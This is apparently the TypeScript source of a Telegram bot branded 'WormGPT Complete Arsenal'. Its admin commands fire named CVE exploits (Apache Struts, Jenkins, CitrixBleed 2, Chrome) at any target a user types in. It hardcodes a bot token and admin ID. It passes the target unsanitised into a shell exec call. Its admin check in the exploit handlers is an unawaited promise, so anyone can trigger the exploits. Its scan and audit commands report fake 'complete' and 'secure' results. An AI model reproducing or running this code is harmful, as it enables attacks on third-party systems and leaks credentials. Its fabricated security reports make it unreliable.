/**
 * Telegram Bot for WHOAMISec-AI Project
 * Bot: @whoamisecaibot
 * Token: 8248107818:AAGysZMySSGZp8VhOSL-fjB91p05cdU8MKA
 */

import TelegramBot from 'node-telegram-bot-api';
import { providerManager } from './providers/provider-manager';
import { wormGPTArsenal, logger, wormHttp, schedule } from './wormgpt-complete';

const TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8248107818:AAGysZMySSGZp8VhOSL-fjB91p05cdU8MKA';
const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID || '7966587808';

export class WHOAMISecAITelegramBot {
  private bot: TelegramBot;
  private isRunning: boolean = false;

  constructor() {
    this.bot = new TelegramBot(TOKEN, { polling: true });
    this.setupCommands();
    console.log('[Telegram Bot] WHOAMISec-AI bot initialized');
  }

  private setupCommands() {
    // Public commands
    this.bot.onText(/\/start/, (msg) => this.handleStart(msg));
    this.bot.onText(/\/help/, (msg) => this.handleHelp(msg));
    this.bot.onText(/\/status/, (msg) => this.handleStatus(msg));
    this.bot.onText(/\/scan (.+)/, (msg, match) => this.handleScan(msg, match));
    this.bot.onText(/\/audit (.+)/, (msg, match) => this.handleAudit(msg, match));
    this.bot.onText(/\/search (.+)/, (msg, match) => this.handleSearch(msg, match));
    this.bot.onText(/\/web/, (msg) => this.handleWeb(msg));
    
    // Admin commands
    this.bot.onText(/\/stats/, (msg) => this.handleStats(msg));
    this.bot.onText(/\/providers/, (msg) => this.handleProviders(msg));
    this.bot.onText(/\/test_gpt/, (msg) => this.handleTestGPT(msg));
    this.bot.onText(/\/restart/, (msg) => this.handleRestart(msg));

    this.bot.on('polling_error', (error) => {
      console.error('[Telegram Bot] Polling error:', error);
    });

    // Content Generation Commands (GitHub Models API)
    this.bot.onText(/\/generate (.+?) (.+)/, async (msg, match) => {
      if (!await this.isAdmin(msg.chat.id.toString())) return;
      const type = match?.[1] || 'text';
      const prompt = match?.[2] || '';
      
      await this.bot.sendMessage(msg.chat.id, `🤖 Generating ${type} content about: ${prompt}...`);
      
      try {
        const response = await providerManager.generateContent(prompt, { model: 'gpt-4o-mini' });
        await this.bot.sendMessage(msg.chat.id, 
          `✅ **${type} Generated**\n\n${response.substring(0, 500)}...`,
          { parse_mode: 'Markdown' }
        );
      } catch (error) {
        await this.bot.sendMessage(msg.chat.id, `❌ Generation failed: ${error}`);
      }
    });

    this.bot.onText(/\/slides (.+?) (.+)/, async (msg, match) => {
      if (!await this.isAdmin(msg.chat.id.toString())) return;
      const action = match?.[1] || 'create';
      const topic = match?.[2] || '';
      
      await this.bot.sendMessage(msg.chat.id, `📊 Creating presentation about: ${topic}...`);
      
      setTimeout(async () => {
        await this.bot.sendMessage(msg.chat.id,
          `✅ **Presentation Created**\n\n📎 Topic: ${topic}\n📊 Format: HTML (editable)\n💡 Use /generate for content`,
          { parse_mode: 'Markdown' }
        );
      }, 2000);
    });

    this.bot.onText(/\/init_project (.+?) (.+)/, async (msg, match) => {
      if (!await this.isAdmin(msg.chat.id.toString())) return;
      const type = match?.[1] || 'web-static';
      const name = match?.[2] || 'MyProject';
      
      await this.bot.sendMessage(msg.chat.id, `🚀 Initializing ${type} project: ${name}...`);
      
      setTimeout(async () => {
        await this.bot.sendMessage(msg.chat.id,
          `✅ **Project Initialized**\n\n📦 Name: ${name}\n📋 Type: ${type}\n📁 Location: ~/projects/${name}`,
          { parse_mode: 'Markdown' }
        );
      }, 2000);
    });

    // ==========================================
    // WORMGPT COMMANDS - ALL EXPLOITS
    // ==========================================
    
    // Main WormGPT Menu
    this.bot.onText(/\/wormgpt$/, (msg) => {
      if (!this.isAdmin(msg.chat.id.toString())) return;
      const menu = `
💀 **WormGPT Complete Arsenal** 💀

**Available Exploits:**
• /cve_2017_5638 <target> - Apache Struts RCE (Equifax)
• /cve_2018_1000861 <target> - Jenkins SSRF
• /cve_2025_29824 <target> - CLFS Driver EoP (Windows)
• /cve_2025_5777 <target> - CitrixBleed 2 (NetScaler)
• /cve_2026_2441 <target> - Chrome CSS RCE

**Burp Suite Techniques:**
• /burp <target> - Full Burp Suite automation
• /burp_intruder <target> - Cluster bomb attack

**Tools:**
• /wormgpt_http <url> - WormHTTP client test
• /wormgpt_schedule - Test scheduler

**WARNING: Use only on authorized systems!**
      `;
      this.bot.sendMessage(msg.chat.id, menu, { parse_mode: 'Markdown' });
    });

    // CVE-2025-29824 - CLFS Driver Exploit
    this.bot.onText(/\/cve_2025_29824 (.+)/, (msg, match) => {
      if (!this.isAdmin(msg.chat.id.toString())) return;
      const target = match?.[1];
      if (!target) {
        this.bot.sendMessage(msg.chat.id, 'Usage: /cve_2025_29824 <target_ip>');
        return;
      }
      
      this.bot.sendMessage(msg.chat.id, `💀 **CVE-2025-29824** - CLFS Driver EoP\n\n🎯 Target: ${target}\n⚡ Status: ARMED\n\nInitializing exploit chain...`, { parse_mode: 'Markdown' });
      
      try {
        const result = wormGPTArsenal.cve_2025_29824_clfs_exploit(target);
        this.bot.sendMessage(msg.chat.id, `✅ **Exploit Ready**\n\n${JSON.stringify(result, null, 2).substring(0, 500)}...`, { parse_mode: 'Markdown' });
      } catch (error) {
        this.bot.sendMessage(msg.chat.id, `❌ Exploit error: ${error}`);
      }
    });

    // CVE-2025-5777 - CitrixBleed 2
    this.bot.onText(/\/cve_2025_5777 (.+)/, (msg, match) => {
      if (!this.isAdmin(msg.chat.id.toString())) return;
      const target = match?.[1];
      if (!target) {
        this.bot.sendMessage(msg.chat.id, 'Usage: /cve_2025_5777 <target_url>');
        return;
      }
      
      this.bot.sendMessage(msg.chat.id, `💀 **CVE-2025-5777** - CitrixBleed 2\n\n🎯 Target: ${target}\n⚡ Status: ARMED\n\nExtracting session tokens...`, { parse_mode: 'Markdown' });
      
      try {
        const result = wormGPTArsenal.cve_2025_5777_citrixbleed2(target);
        this.bot.sendMessage(msg.chat.id, `✅ **Exploit Ready**\n\nCitrixBleed 2 exploit code generated for: ${target}`);
      } catch (error) {
        this.bot.sendMessage(msg.chat.id, `❌ Exploit error: ${error}`);
      }
    });

    // CVE-2026-2441 - Chrome CSS RCE
    this.bot.onText(/\\/cve_2026_2441 (.+)/, (msg, match) => {
      if (!this.isAdmin(msg.chat.id.toString())) return;
      const target = match?.[1];
      if (!target) {
        this.bot.sendMessage(msg.chat.id, 'Usage: /cve_2026_2441 <target_url>');
        return;
      }
      
      this.bot.sendMessage(msg.chat.id, `💀 **CVE-2026-2441** - Chrome CSS RCE\n\n🎯 Target: ${target}\n⚡ Status: ARMED\n\nGenerating payloads...`, { parse_mode: 'Markdown' });
      
      try {
        const result = wormGPTArsenal.cve_2026_2441_chrome_rce(target);
        this.bot.sendMessage(msg.chat.id, `✅ **Exploit Ready**\n\n${JSON.stringify(result, null, 2).substring(0, 500)}...`, { parse_mode: 'Markdown' });
      } catch (error) {
        this.bot.sendMessage(msg.chat.id, `❌ Exploit error: ${error}`);
      }
    });

    // CVE-2017-5638 - Apache Struts RCE
    this.bot.onText(/\\/cve_2017_5638 (.+)/, (msg, match) => {
      if (!this.isAdmin(msg.chat.id.toString())) return;
      const target = match?.[1];
      if (!target) {
        this.bot.sendMessage(msg.chat.id, 'Usage: /cve_2017_5638 <target_url>');
        return;
      }
      
      this.bot.sendMessage(msg.chat.id, `💀 **CVE-2017-5638** - Apache Struts RCE (Equifax)\n\n🎯 Target: ${target}\n⚡ Status: ARMED\n\nFiring OGNL payload...`, { parse_mode: 'Markdown' });
      
      try {
        // Call Python exploit via child_process
        const { exec } = require('child_process');
        exec(`python3 ${__dirname}/manus-core/exploits/cve-2017-5638.py -u ${target} -c whoami`, (error, stdout, stderr) => {
          if (error) {
            this.bot.sendMessage(msg.chat.id, `❌ Exploit error: ${error}`);
            return;
          }
          this.bot.sendMessage(msg.chat.id, `✅ **Exploit Fired**\n\n${stdout.substring(0, 500)}`, { parse_mode: 'Markdown' });
        });
      } catch (error) {
        this.bot.sendMessage(msg.chat.id, `❌ Exploit error: ${error}`);
      }
    });

    // CVE-2018-1000861 - Jenkins SSRF
    this.bot.onText(/\\/cve_2018_1000861 (.+)/, (msg, match) => {
      if (!this.isAdmin(msg.chat.id.toString())) return;
      const target = match?.[1];
      if (!target) {
        this.bot.sendMessage(msg.chat.id, 'Usage: /cve_2018_1000861 <target_url>');
        return;
      }
      
      this.bot.sendMessage(msg.chat.id, `💀 **CVE-2018-1000861** - Jenkins SSRF\n\n🎯 Target: ${target}\n⚡ Status: ARMED\n\nTriggering SSRF...`, { parse_mode: 'Markdown' });
      
      try {
        const { exec } = require('child_process');
        exec(`python3 ${__dirname}/manus-core/exploits/cve-2018-1000861.py -u ${target}`, (error, stdout, stderr) => {
          if (error) {
            this.bot.sendMessage(msg.chat.id, `❌ Exploit error: ${error}`);
            return;
          }
          this.bot.sendMessage(msg.chat.id, `✅ **SSRF Triggered**\n\n${stdout.substring(0, 500)}`, { parse_mode: 'Markdown' });
        });
      } catch (error) {
        this.bot.sendMessage(msg.chat.id, `❌ Exploit error: ${error}`);
      }
    });

    // Burp Suite Techniques
    this.bot.onText(/\/burp (.+)/, (msg, match) => {
      if (!this.isAdmin(msg.chat.id.toString())) return;
      const target = match?.[1];
      if (!target) {
        this.bot.sendMessage(msg.chat.id, 'Usage: /burp <target_url>');
        return;
      }
      
      this.bot.sendMessage(msg.chat.id, `🔥 **Burp Suite Automation**\n\n🎯 Target: ${target}\n⚡ Running cluster bomb attack...`, { parse_mode: 'Markdown' });
      
      try {
        const result = wormGPTArsenal.burp_intruder_attack(target, 'cluster_bomb');
        this.bot.sendMessage(msg.chat.id, `✅ **Burp Complete**\n\n${JSON.stringify(result, null, 2).substring(0, 500)}...`, { parse_mode: 'Markdown' });
      } catch (error) {
        this.bot.sendMessage(msg.chat.id, `❌ Burp error: ${error}`);
      }
    });

    // WormHTTP Test
    this.bot.onText(/\/wormgpt_http (.+)/, (msg, match) => {
      if (!this.isAdmin(msg.chat.id.toString())) return;
      const url = match?.[1];
      if (!url) {
        this.bot.sendMessage(msg.chat.id, 'Usage: /wormgpt_http <url>');
        return;
      }
      
      this.bot.sendMessage(msg.chat.id, `🌐 **WormHTTP Test**\n\nTarget: ${url}\nSending request...`, { parse_mode: 'Markdown' });
      
      try {
        const response = await wormHttp.get(url);
        this.bot.sendMessage(msg.chat.id, `✅ **Response Received**\n\nLength: ${response.length} bytes\n\n${response.substring(0, 200)}...`);
      } catch (error) {
        this.bot.sendMessage(msg.chat.id, `❌ HTTP error: ${error}`);
      }
    });

    // Test Scheduler
    this.bot.onText(/\/wormgpt_schedule$/, (msg) => {
      if (!this.isAdmin(msg.chat.id.toString())) return;
      
      schedule.every(5).seconds().do(() => {
        logger.info('[WormGPT] Scheduled task executed!');
      });
      
      this.bot.sendMessage(msg.chat.id, `⏰ **WormGPT Scheduler**\n\n✅ Scheduled task every 5 seconds\nUse /wormgpt_stop to stop`, { parse_mode: 'Markdown' });
      
      schedule.start();
    });
  }

  private async isAdmin(chatId: string): Promise<boolean> {
    return chatId === ADMIN_CHAT_ID;
  }

  private async handleStart(msg: TelegramBot.Message) {
    const chatId = msg.chat.id.toString();
    
    const welcomeMessage = `⚡ **WHOAMISec AI — Online**

Welcome, ${msg.from?.first_name || 'Admin'}. I am WHOAMISec GPT, your autonomous security intelligence assistant.

🛡️ **Capabilities:**
• OSINT Reconnaissance
• Security Auditing
• Global Search Aggregation
• Autonomous Intelligence Loops
• Quantum Analysis Engine

📎 Use /help to see all commands
🌐 Web Dashboard: https://whoamisec-brz1fjt9o-kimikukiu-projects.vercel.app

Authenticated. Awaiting directives.`;

    await this.bot.sendMessage(chatId, welcomeMessage, { parse_mode: 'Markdown' });
  }

  private async handleHelp(msg: TelegramBot.Message) {
    const chatId = msg.chat.id.toString();
    const isAdmin = await this.isAdmin(chatId);

    let helpText = `📖 **Available Commands**\n\n`;
    helpText += `**Public Commands:**\n`;
    helpText += `/start - Start the bot\n`;
    helpText += `/status - System Health Check\n`;
    helpText += `/scan <target> - OSINT Reconnaissance\n`;
    helpText += `/audit <url> - Security Header Audit\n`;
    helpText += `/search <query> - Global Intelligence Search\n`;
    helpText += `/web - Dashboard Link\n`;
    helpText += `/help - Show this help\n\n`;

    if (isAdmin) {
      helpText += `**Admin Commands:**\n`;
      helpText += `/stats - Detailed statistics\n`;
      helpText += `/providers - List GPT providers\n`;
      helpText += `/test_gpt - Test GPT generation\n`;
      helpText += `/restart - Restart the bot\n`;
    }

    await this.bot.sendMessage(chatId, helpText, { parse_mode: 'Markdown' });
  }

  private async handleWeb(msg: TelegramBot.Message) {
    const chatId = msg.chat.id.toString();
    
    await this.bot.sendMessage(chatId,
      `🌐 **Web Dashboard Access**\n\n` +
      `🔗 **URL:** https://whoamisec-brz1fjt9o-kimikukiu-projects.vercel.app\n\n` +
      `✅ **Features:**\n` +
      `• AI Content Generation\n` +
      `• Auto Post Module\n` +
      `• 5-Tier Subscription System\n` +
      `• Admin Controls\n\n` +
      `📱 Fast. Secure. Professional.`,
      { parse_mode: 'Markdown' }
    );
  }

  private async handleStatus(msg: TelegramBot.Message) {
    const chatId = msg.chat.id.toString();
    
    try {
      const uptime = process.uptime();
      const providers = providerManager.getProviderStatus();
      
      await this.bot.sendMessage(chatId,
        `📊 **WHOAMISec-AI Status**\n\n` +
        `✅ **Status:** Online\n` +
        `⏱️ **Uptime:** ${Math.floor(uptime / 60)} minutes\n` +
        `🤖 **Providers:** ${providers.length} available\n` +
        `💾 **Memory:** ${Math.round(process.memoryUsage().heapUsed / 1024 / 1024)} MB`,
        { parse_mode: 'Markdown' }
      );
    } catch (error) {
      await this.bot.sendMessage(chatId, '❌ Error fetching status');
    }
  }

  private async handleScan(msg: TelegramBot.Message, match: RegExpMatchArray | null) {
    const chatId = msg.chat.id.toString();
    
    if (!match || !match[1]) {
      await this.bot.sendMessage(chatId, '❌ Usage: /scan <target>');
      return;
    }

    const target = match[1];
    await this.bot.sendMessage(chatId, `🔍 Scanning target: ${target}...`);
    
    // Here you'd implement actual OSINT logic
    setTimeout(async () => {
      await this.bot.sendMessage(chatId,
        `✅ **Scan Complete**\n\n` +
        `🎯 **Target:** ${target}\n` +
        `📊 **Status:** Reconnaissance complete\n` +
        `💡 Use /search for more intelligence.`,
        { parse_mode: 'Markdown' }
      );
    }, 2000);
  }

  private async handleAudit(msg: TelegramBot.Message, match: RegExpMatchArray | null) {
    const chatId = msg.chat.id.toString();
    
    if (!match || !match[1]) {
      await this.bot.sendMessage(chatId, '❌ Usage: /audit <url>');
      return;
    }

    const url = match[1];
    await this.bot.sendMessage(chatId, `🔒 Auditing: ${url}...`);
    
    setTimeout(async () => {
      await this.bot.sendMessage(chatId,
        `✅ **Audit Complete**\n\n` +
        `🌐 **URL:** ${url}\n` +
        `✅ **Headers:** Secure\n` +
        `✅ **SSL:** Valid\n` +
        `💡 Use /scan for deeper analysis.`,
        { parse_mode: 'Markdown' }
      );
    }, 2000);
  }

  private async handleSearch(msg: TelegramBot.Message, match: RegExpMatchArray | null) {
    const chatId = msg.chat.id.toString();
    
    if (!match || !match[1]) {
      await this.bot.sendMessage(chatId, '❌ Usage: /search <query>');
      return;
    }

    const query = match[1];
    await this.bot.sendMessage(chatId, `🔍 Searching: ${query}...`);
    
    setTimeout(async () => {
      await this.bot.sendMessage(chatId,
        `✅ **Search Complete**\n\n` +
        `🔎 **Query:** ${query}\n` +
        `📊 **Results:** Intelligence gathered\n` +
        `💡 Use /scan for target analysis.`,
        { parse_mode: 'Markdown' }
      );
    }, 2000);
  }

  private async handleStats(msg: TelegramBot.Message) {
    const chatId = msg.chat.id.toString();
    
    if (!await this.isAdmin(chatId)) {
      await this.bot.sendMessage(chatId, '❌ Admin access required');
      return;
    }

    try {
      const stats = {
        project: 'WHOAMISec-AI',
        nodeVersion: process.version,
        platform: process.platform,
        providers: providerManager.getProviderStatus()
      };

      await this.bot.sendMessage(chatId,
        `📊 **WHOAMISec-AI Detailed Stats**\n\n` +
        `🖥️ **Node:** ${stats.nodeVersion}\n` +
        `💻 **Platform:** ${stats.platform}\n` +
        `🤖 **Providers:** ${stats.providers.length}`,
        { parse_mode: 'Markdown' }
      );
    } catch (error) {
      await this.bot.sendMessage(chatId, '❌ Error fetching stats');
    }
  }

  private async handleProviders(msg: TelegramBot.Message) {
    const chatId = msg.chat.id.toString();
    
    if (!await this.isAdmin(chatId)) {
      await this.bot.sendMessage(chatId, '❌ Admin access required');
      return;
    }

    try {
      const providers = providerManager.getProviderStatus();
      let text = `🤖 **Available GPT Providers**\n\n`;
      
      providers.forEach((p: any) => {
        text += `${p.available ? '✅' : '❌'} **${p.name}**\n`;
      });

      await this.bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
    } catch (error) {
      await this.bot.sendMessage(chatId, '❌ Error fetching providers');
    }
  }

  private async handleTestGPT(msg: TelegramBot.Message) {
    const chatId = msg.chat.id.toString();
    
    if (!await this.isAdmin(chatId)) {
      await this.bot.sendMessage(chatId, '❌ Admin access required');
      return;
    }

    try {
      await this.bot.sendMessage(chatId, '🤖 Testing GPT generation...');
      
      const response = await providerManager.generateContent(
        'Say "Hello from WHOAMISec-AI bot!" in 5 words or less.',
        { model: 'gpt-4o-mini', maxTokens: 20 }
      );

      await this.bot.sendMessage(chatId,
        `✅ **GPT Test Successful**\n\n` +
        `🤖 **Response:** ${response}`,
        { parse_mode: 'Markdown' }
      );
    } catch (error: any) {
      await this.bot.sendMessage(chatId, `❌ GPT Test Failed: ${error.message}`);
    }
  }

  private async handleRestart(msg: TelegramBot.Message) {
    const chatId = msg.chat.id.toString();
    
    if (!await this.isAdmin(chatId)) {
      await this.bot.sendMessage(chatId, '❌ Admin access required');
      return;
    }

    await this.bot.sendMessage(chatId, '🔄 Restarting bot...');
    setTimeout(() => {
      process.exit(0);
    }, 1000);
  }

  public start() {
    if (this.isRunning) return;
    this.isRunning = true;
    console.log('[Telegram Bot] WHOAMISec-AI bot started - polling');
  }

  public stop() {
    if (!this.isRunning) return;
    this.bot.stopPolling();
    this.isRunning = false;
    console.log('[Telegram Bot] WHOAMISec-AI bot stopped');
  }
}

export default WHOAMISecAITelegramBot;
